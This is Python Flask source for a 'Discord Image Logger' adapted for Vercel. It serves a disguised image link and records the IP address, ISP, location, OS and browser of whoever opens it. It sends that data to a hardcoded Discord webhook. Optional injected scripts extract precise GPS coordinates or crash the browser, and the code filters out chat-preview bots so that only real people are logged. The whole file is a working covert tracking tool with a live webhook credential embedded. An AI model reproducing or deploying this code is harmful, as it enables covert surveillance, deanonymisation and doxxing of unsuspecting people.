# Discord Image Logger - Vercel Optimized Version
# Original by DeKrypt | Adapted for Flask/Vercel

from flask import Flask, request, make_response, render_template_string
import requests
import base64
import traceback
import httpagentparser
from urllib import parse

app = Flask(__name__)

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1436665807601012878/c0DeklbWYrZjK71YSC672nVuLNa8WNPLeN-c_GxZ5dqA7hv3fg0MMa40TqI_fI2X5zpU",
    "image": "https://i.hizliresim.com/e41xq3y.png", 
    "imageArgument": True, 

    # CUSTOMIZATION #
    "username": "Image Logger", 
    "color": 0x00FFFF, 

    # OPTIONS #
    "crashBrowser": False, 
    "accurateLocation": False, 
    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger.", 
        "richMessage": True, 
    },
    "vpnCheck": 1, 
    "linkAlerts": True, 
    "buggedImage": True, 
    "antiBot": 1, 

    # REDIRECTION #
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164")
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def botCheck(ip, useragent):
    if not ip or not useragent: return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"Link sent in chat!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }]
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        return

    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4: return
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"**A User Opened the Image!**\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Provider:** `{info.get('isp')}`\n**Country:** `{info.get('country')}`\n**City:** `{info.get('city')}`\n**OS/Browser:** `{os} / {browser}`\n**Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords}`",
        }]
    }
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    try:
        # IP ve User Agent Alımı
        ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
        user_agent = request.headers.get('user-agent', '')
        endpoint = f"/{path}"

        # Görsel URL Belirleme
        img_url = config["image"]
        if config["imageArgument"]:
            arg_url = request.args.get('url') or request.args.get('id')
            if arg_url:
                try: img_url = base64.b64decode(arg_url).decode()
                except: pass

        # Bot Kontrolü
        if botCheck(ip, user_agent):
            makeReport(ip, user_agent, endpoint=endpoint, url=img_url)
            if config["buggedImage"]:
                response = make_response(binaries["loading"])
                response.headers.set('Content-Type', 'image/jpeg')
                return response
            return redirect(img_url)

        # Normal Kullanıcı Raporlama
        location_data = request.args.get('g')
        coords = base64.b64decode(location_data).decode() if location_data else None
        result = makeReport(ip, user_agent, coords=coords, endpoint=endpoint, url=img_url)

        # Yanıt Hazırlama
        if config["redirect"]["redirect"]:
            return redirect(config["redirect"]["page"])

        # HTML İçeriği (JS Injectler dahil)
        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip).replace("{city}", result.get('city', 'Unknown'))
            # Diğer replace işlemleri buraya eklenebilir...

        html_content = f"<html><body>{message}"
        if config["crashBrowser"]:
            html_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
        
        if config["accurateLocation"] and not location_data:
            html_content += """<script>
                navigator.geolocation.getCurrentPosition(function(c){
                    let url = new URL(window.location.href);
                    url.searchParams.set('g', btoa(c.coords.latitude + "," + c.coords.longitude));
                    window.location.replace(url.toString());
                });
            </script>"""
        
        html_content += "</body></html>"
        return html_content

    except Exception:
        reportError(traceback.format_exc())
        return "500 - Internal Server Error", 500

# Vercel için 'app' değişkeni önemli
if __name__ == '__main__':
    app.run()
